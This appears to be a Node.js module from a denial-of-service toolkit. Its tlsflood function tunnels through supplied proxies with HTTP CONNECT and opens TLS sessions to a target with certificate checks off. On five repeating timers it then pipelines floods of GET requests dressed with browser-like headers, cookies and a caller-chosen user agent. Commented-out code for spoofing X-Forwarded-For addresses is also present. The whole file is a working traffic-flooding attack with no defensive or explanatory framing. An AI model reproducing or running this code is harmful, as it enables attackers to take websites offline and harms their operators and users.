const url = require('url');
const {
    constants
} = require('crypto');
var http = require('http'),
    tls = require('tls');

function get_cookies(args, secondcookies) {
    let cookies = "";
    if (!(args.headers['cookie'] == undefined)) {
        cookies += args.headers['cookie']
        if (!(secondcookies == 'false')) cookies += ";"
    }
    if (!(secondcookies == 'false')) cookies += secondcookies;
    return cookies;
}

function randomByte() {
    return Math.round(Math.random() * 256);
}

function randomIp() {
    const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

    return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

async function tlsflood(args, host, port, useragent, secondcookies) {
    const post_recibe = args.postdata;
    //var data2 = querystring.stringify(post_recibe)
    var parsed = url.parse(args.target)

    _intervals = [],
        timelimit = 100
    for (let i = 0; i < 5; i++) {
        _intervals[i] = setInterval(() => {
            //console.log("----------Start Flood!----------")
            //tls.DEFAULT_ECDH_CURVE = 'auto'

            const agent = new http.Agent({
                keepAlive: true, // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
                keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
                maxSockets: Infinity, // Maximum number of sockets to allow per host. Defaults to Infinity.
                // maxFreeSockets: 256   // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
            });

            var tlsSessionStore = {};

            var req = http.request({ //set proxy session
                host: host,
                port: port,
                agent: agent,
                globalAgent: agent,
                headers: {
                    'Host': parsed.host,
                    'Proxy-Connection': 'Keep-Alive',
                    'Connection': 'Keep-Alive',
                },
                method: 'CONNECT',
                path: parsed.host + ':443'
            }, () => {
                req.setSocketKeepAlive(true);
            });

            req.on('connect', function(res, socket, head) { //open raw request
                tls.authorized = true;
                tls.sync = true;
                var tlsConnection = tls.connect({
                    ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                    secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
                    honorCipherOrder: true,
                    requestCert: true,
                    host: parsed.host,
                    secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1_1,
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    socket: socket
                }, function() {
                    var mm = "GET" // ? args.postdata : "POST"
                    var req = `${mm} ` +
                        args.target +
                        ' HTTP/1.3' +
                        '\r\nHost: ' +
                        parsed.host +
                        '\r\nReferer: ' +
                        args.target +
                        '\r\nOrigin: ' +
                        args.target +
                        //'\r\nX-Real-IP: '
                        //+randomIp();+
                        //'\r\nX-Forwarded-For: '
                        //+randomIp()+
                        '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' +
                        '\r\nAccept-Language: en-US,en;q=0.9' +
                        '\r\nCache-Control: no-cache' +
                        '\r\nUser-Agent: ' + useragent +
                        '\r\nUpgrade-Insecure-Requests: 1' +
                        '\r\nAccept-Encoding: gzip, deflate' +
                        '\r\nAccept-Language: en-US,en;q=0.9' +
                        '\r\nCookie: ' + get_cookies(args, secondcookies) +
                        '\r\nConnection: Keep-Alive\r\n\r\n';

                    tlsConnection.setKeepAlive(true, 10000);
                    tlsConnection.setTimeout(10000);
                    for (let j = 0; j < args.pipelining; j++) {
                        tlsConnection.write(req);
                        //console.log("Sent!")
                    }
                });

                tlsConnection.on('newSession', function(id, data) {
                    tlsSessionStore[id] = data;
                });

                tlsConnection.on('resumeSession', function(id, cb) {
                    cb(null, tlsSessionStore[id] || null);
                });

                tlsConnection.on('disconnected', () => {
                    tlsConnection.destroy();
                });
                tlsConnection.on('timeout', () => {
                    tlsConnection.destroy()
                });
                tlsConnection.on('error', (err) => {
                    tlsConnection.destroy()
                });
                tlsConnection.on('data', (chunk) => {
                    setTimeout(function() { /*tlsConnection.abort();*/
                        return delete tlsConnection;
                    }, 10000);
                });

                tlsConnection.on('end', () => {
                    tlsConnection.destroy();
                });
            }).end();

        }, 541);
    }
}


function start(args, proxy, ua, secondcookies) {
    tlsflood(args, proxy.split(":")[0], proxy.split(":")[1], ua, secondcookies)
}

module.exports = start;